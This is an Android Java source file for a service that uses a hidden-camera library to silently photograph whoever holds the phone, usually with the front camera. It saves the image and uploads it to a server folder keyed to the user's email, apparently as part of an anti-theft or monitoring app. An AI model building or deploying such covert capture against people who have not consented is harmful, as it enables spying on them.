package services;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Environment;
import android.os.IBinder;
import android.provider.MediaStore;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.support.v4.app.ActivityCompat;
import android.widget.Toast;

import com.androidhiddencamera.CameraConfig;
import com.androidhiddencamera.CameraError;
import com.androidhiddencamera.HiddenCameraService;
import com.androidhiddencamera.HiddenCameraUtils;
import com.androidhiddencamera.config.CameraFacing;
import com.androidhiddencamera.config.CameraImageFormat;
import com.androidhiddencamera.config.CameraResolution;
import com.androidhiddencamera.config.CameraRotation;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;

import databases.SQLiteHandler;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.RequestBody;

import static helpers.Constants.BASE_URL;

public class CameraService extends HiddenCameraService {


    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {

            if (HiddenCameraUtils.canOverDrawOtherApps(this)) {

                PackageManager packageManager = this.getPackageManager();
                if (packageManager.hasSystemFeature(PackageManager.FEATURE_CAMERA_FRONT)) {
                    CameraConfig cameraConfig = new CameraConfig()
                            .getBuilder(this)
                            .setCameraFacing(CameraFacing.FRONT_FACING_CAMERA)
                            .setCameraResolution(CameraResolution.HIGH_RESOLUTION)
                            .setImageFormat(CameraImageFormat.FORMAT_JPEG)
                            .setImageRotation(CameraRotation.ROTATION_270)
                            .build();

                    startCamera(cameraConfig);

                    new android.os.Handler().postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            takePicture();
                        }
                    }, 2000);
                }
                else {
                    CameraConfig cameraConfig = new CameraConfig()
                            .getBuilder(this)
                            .setCameraFacing(CameraFacing.REAR_FACING_CAMERA)
                            .setCameraResolution(CameraResolution.HIGH_RESOLUTION)
                            .setImageFormat(CameraImageFormat.FORMAT_JPEG)
                            .setImageRotation(CameraRotation.ROTATION_90)
                            .build();

                    startCamera(cameraConfig);

                    new android.os.Handler().postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            takePicture();
                        }
                    }, 2000);
                }

            } else {

                //Open settings to grant permission for "Draw other apps".
                HiddenCameraUtils.openDrawOverPermissionSetting(this);
            }
        } else {
            //TODO Ask your parent activity for providing runtime permission
            Toast.makeText(this, "Camera permission not available", Toast.LENGTH_SHORT).show();
        }
        return START_NOT_STICKY;
    }

    @Override
    public void onImageCapture(@NonNull File imageFile) {

        BitmapFactory.Options options = new BitmapFactory.Options();
        options.inPreferredConfig = Bitmap.Config.RGB_565;
        final Bitmap bitmap = BitmapFactory.decodeFile(imageFile.getAbsolutePath(), options);
        //Do something with the bitmap

        // Assume block needs to be inside a Try/Catch block.
        String path = Environment.getExternalStorageDirectory().toString();
        OutputStream fOut = null;
        File file = new File(path, "MAT-Picture"+".jpg"); // the File to save , append increasing numeric counter to prevent files from getting overwritten.
        try {
            fOut = new FileOutputStream(file);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }

        bitmap.compress(Bitmap.CompressFormat.JPEG, 85, fOut); // saving the Bitmap to a file compressed as a JPEG with 85% compression rate
        try {
            assert fOut != null;
            fOut.flush(); // Not really required
        } catch (IOException e) {
            e.printStackTrace();
        }
        try {
            fOut.close(); // do not forget to close the stream
        } catch (IOException e) {
            e.printStackTrace();
        }

        try {
            MediaStore.Images.Media.insertImage(getContentResolver(),file.getAbsolutePath(),file.getName(),file.getName());
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }


        final String url = BASE_URL +"/fileupload.php";

        final String picture = "MAT-Picture"+".jpg";
        final String storage_path = Environment.getExternalStorageDirectory().toString() + "/" + picture;
        Thread t = new Thread(new Runnable() {
            @Override
            public void run() {
                final File f = new File(storage_path);
                String content_type = "jpg";
                OkHttpClient client = new OkHttpClient();
                RequestBody file_body = RequestBody.create(MediaType.parse(content_type),f);

                SQLiteHandler sqLiteHandler = new SQLiteHandler(CameraService.this);
                Cursor cursor = sqLiteHandler.getUserData();
                cursor.moveToFirst();
                String email = cursor.getString(cursor.getColumnIndex("email"));

                RequestBody request_body = new MultipartBody.Builder()
                        .setType(MultipartBody.FORM)
                        .addFormDataPart("type",content_type)
                        .addFormDataPart("uploaded_file",picture,file_body)
                        .addFormDataPart("folder_name",email.toLowerCase())
                        .build();

                okhttp3.Request request = new okhttp3.Request.Builder()
                        .url(url)
                        .post(request_body)
                        .build();

                try{
                    okhttp3.Response response = client.newCall(request).execute();

                    if (!response.isSuccessful()){
                        stopSelf();
                    }
                    else {
                        stopSelf();
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        });

        t.start();

    }

    @Override
    public void onCameraError(@CameraError.CameraErrorCodes int errorCode) {
        switch (errorCode) {
            case CameraError.ERROR_CAMERA_OPEN_FAILED:
                Toast.makeText(this, "Cannot open camera.", Toast.LENGTH_LONG).show();
                break;
            case CameraError.ERROR_IMAGE_WRITE_FAILED:
                Toast.makeText(this, "Cannot write image captured by camera.", Toast.LENGTH_LONG).show();
                break;
            case CameraError.ERROR_CAMERA_PERMISSION_NOT_AVAILABLE:
                Toast.makeText(this, "Camera permission not available.", Toast.LENGTH_LONG).show();
                break;
            case CameraError.ERROR_DOES_NOT_HAVE_OVERDRAW_PERMISSION:
                HiddenCameraUtils.openDrawOverPermissionSetting(this);
                break;
            case CameraError.ERROR_DOES_NOT_HAVE_FRONT_CAMERA:
                Toast.makeText(this, "Your device does not have front camera.", Toast.LENGTH_LONG).show();
                break;
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }
}